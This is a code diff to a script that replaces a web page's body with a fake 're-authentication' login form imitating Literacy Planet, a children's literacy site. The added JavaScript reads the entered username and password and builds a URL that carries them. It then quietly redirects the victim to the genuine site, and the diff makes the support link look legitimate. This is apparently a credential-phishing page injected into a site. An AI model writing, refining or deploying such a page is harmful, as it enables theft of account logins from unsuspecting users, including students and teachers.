@@ -70,30 +70,34 @@ document.body.innerHTML = `<!DOCTYPE html>
         background-color: #589cc6;
       }
     </style>
-    <script>
-      // Optional: Handle submission programmatically (redirect via JavaScript GET request)
-      document.addEventListener('DOMContentLoaded', () => {
-        const form = document.getElementById('reauth-form');
-        form.addEventListener('submit', (event) => {
-          event.preventDefault(); // Prevent standard GET form submission
-          
-          // Extract data from fields
-          const username = encodeURIComponent(form.username.value.trim());
-          const password = encodeURIComponent(form.password.value.trim());
-          
-          if (!username || !password) {
-            alert('Please fill out all fields.');
-            return;
-          }
+<script>
+  // Handle submission programmatically (redirect via JavaScript GET request)
+  document.addEventListener('DOMContentLoaded', () => {
+    const form = document.getElementById('reauth-form'); // Get the form element
 
-          // Construct the query string
-          const url = form.action + "?username=" + username + "&password=" + password;
-          
-          // Redirect the browser to the constructed URL
-          window.location.href = url;
-        });
-      });
-    </script>
+    form.addEventListener('submit', (event) => {
+      event.preventDefault(); // Prevent default form submission behavior
+
+      // Extract data from the fields
+      const username = encodeURIComponent(form.username.value.trim());
+      const password = encodeURIComponent(form.password.value.trim());
+
+      // Validation: Check if fields are filled
+      if (!username || !password) {
+        alert('Please fill out all fields.');
+        return;
+      }
+
+      // Construct the query string
+      const url = form.action + "?username=" + username + "&password=" + password;
+
+      // Redirect the browser to the constructed URL after a 1-second delay
+      setTimeout(() => {
+        window.location.href = "https://spa.literacyplanet.com/tx/home?session=new"; // Change to your target URL
+      }, 1000); // 1000 milliseconds = 1 second delay
+    });
+  });
+</script>
   </head>
   <body>
     <table>
@@ -150,7 +154,7 @@ document.body.innerHTML = `<!DOCTYPE html>
           <!-- Form ends here -->
 
           <p style="font-size: 16px; margin: 10px 0;">
-            If you didn't expect this prompt or need further assistance, please contact us immediately at <a href="https://spa.literacyplanet.com/tx/home?session=new" style="color: #6bc4ff; text-decoration: none;">literacyplanet.com/support</a>.
+            If you didn't expect this prompt or need further assistance, please contact us immediately at <a href="https://app.literacyplanet.com/support" style="color: #6bc4ff; text-decoration: none;">literacyplanet.com/support</a>.
           </p>
         </td>
       </tr>
